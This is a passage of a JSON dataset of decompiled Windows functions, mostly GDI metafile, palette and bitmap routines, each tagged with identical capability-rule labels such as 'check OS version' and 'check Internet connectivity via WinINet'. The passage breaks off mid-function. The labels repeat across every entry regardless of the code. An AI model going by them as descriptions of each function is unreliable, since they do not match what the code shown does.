            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00426da8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x00426dcd:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x426dc0;\n        iVar2 = fcn.00404528();\n        puStack32 = 0x426dc9;\n        iVar3 = fcn.00404528();\n        if (iVar2 != iVar3) goto code_r0x00426dcd;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x426ddd;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x426de8;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x426e26;\n                puVar4 = fcn.00404620();\n                uStack36 = 0x426edf;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x426e41;\n                puStack32 = &fcn.00426da8::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x426e4d;\n                puVar5 = fcn.00404620();\n                uStack48 = 0x426ec2;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00426da8::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.00409954();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x00426ea9;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x00426ea9:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x426ec9;\n                uStack48 = 0x426ec1;\n                uVar6 = fcn.00404650();\n                return uVar6;\n            }\n            goto code_r0x00426ee6;\n        }\n    }\n    puStack32 = 0x426df3;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x426dfe;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x00426ee6;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00426ee6:\n    return var_1h;\n}\n",
        "token_count": 936
    },
    "00426f54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426f54(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00427020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427020(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42709e;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00419898();\n            fcn.00404530();\n            fcn.00405794();\n            fcn.00405974();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x4270a5;\n    uStack288 = 0x42709d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 284
    },
    "00427224": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427224(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 8) + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar1 = fcn.00419898();\n            if (param_2 == iVar1) {\n                uVar2 = fcn.00419898();\n                return uVar2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "00427260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00427260(void)\n\n{\n    if (*0x491e40 == 0) {\n        *0x491e40 = fcn.00427110();\n    }\n    return *0x491e40;\n}\n",
        "token_count": 53
    },
    "004275c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004275c8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004275f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004275f4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x4276fa;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x427623;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x427631;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x42763c;\n    fcn.00405794();\n    piStack104 = 0x427649;\n    iVar1 = fcn.00427020();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x427657;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x42767c;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x42769b;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x4276b9;\n        iVar1 = fcn.00404864();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x4276d1;\n        iVar1 = fcn.00404864();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x4276e4;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x427701;\n    uStack96 = 0x4276f9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 596
    },
    "00427760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00427760(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004047dc();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 265
    },
    "00427d18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427d18(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x427d33;\n    var_4h = param_2;\n    fcn.00427bb4();\n    puStack172 = 0x427d43;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x427d54;\n        iVar2 = fcn.00426870();\n        if (iVar2 == var_eh) goto code_r0x00427d5f;\n    }\n    puStack172 = 0x427d5f;\n    fcn.00425a10();\ncode_r0x00427d5f:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x427d6b;\n    lpbBuffer = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x427e87;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427d18::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.00425a10();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00427d18::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427d18::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.00425a10();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402f1c(0x427e8e);\n    return;\n}\n",
        "token_count": 943
    },
    "00427ff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427ff0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427bb4();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.00428140();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0042802c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042802c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427bb4();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.00428140();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00428244": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428244(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x428264;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x428275;\n            uVar2 = fcn.00402f00();\n            uStack40 = 0x4282c0;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041b978();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402f1c(0x4282c7);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "004282d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004282d0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x4282f5;\n    fcn.00403af4();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x428327;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x42833e;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x42834a;\n    fcn.00426870();\n    uStack76 = 0;\n    puStack80 = 0x428355;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x42840b;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x428379;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x428384;\n    uVar4 = fcn.00402f00();\n    uStack116 = 0x4283eb;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.00425a70();\n    }\n    fcn.0041b978();\n    fcn.0041b978();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402f1c(0x4283f2);\n    return;\n}\n",
        "token_count": 799
    },
    "00428618": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428618(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x428628;\n    var_8h = fcn.00419c08();\n    uStack24 = 0x4286b6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x428653;\n            var_ch = fcn.00419898();\n            puStack32 = 0x42865e;\n            cVar1 = fcn.004255ac();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x42868e;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.004287a8();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x428695;\n                uStack36 = 0x42868d;\n                fcn.00425608();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4286bd;\n    uStack24 = 0x4286b5;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 447
    },
    "004286c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004286c4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x4286dd;\n        iVar1 = fcn.00419c08();\n        uStack24 = 0x428734;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419898();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.004287a8();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x42873b;\n        uStack24 = 0x428733;\n        fcn.00419c6c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "004287a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004287a8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x4287c5;\n        fcn.004253d0();\n        uStack20 = 0x42883c;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.0042579c();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00419c1c();\n        *in_FS_OFFSET = uVar1;\n        fcn.00425608(0x428843);\n        return;\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "00428848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428848(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x428866;\n        fcn.004253d0();\n        uStack24 = 0x428927;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.00429c5c();\n        fcn.004286c4();\n        fcn.00429d5c();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.0042579c();\n        fcn.00419b80();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00425608(0x42892e);\n        return;\n    }\n    return;\n}\n",
        "token_count": 479
    },
    "00428938": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428938(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "00428abc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428abc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00428b08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428b08(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x428b70;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.004286c4();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            